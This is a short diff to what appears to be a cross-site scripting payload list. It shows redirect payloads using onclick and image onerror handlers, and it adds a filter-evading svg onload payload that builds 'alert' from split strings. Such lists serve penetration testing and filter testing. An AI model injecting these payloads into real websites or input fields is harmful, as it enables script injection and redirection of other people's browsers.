@@ -22,4 +22,6 @@ Redirect Payloads
 <a href="#" onclick="location='https://google.com'">Click me</a>
 <img src=x onerror="location='https://google.com'">
 
-
+Other
+------------
+"><svg/onload​=setTimeout`${'ale'+'rt'}(1)`>
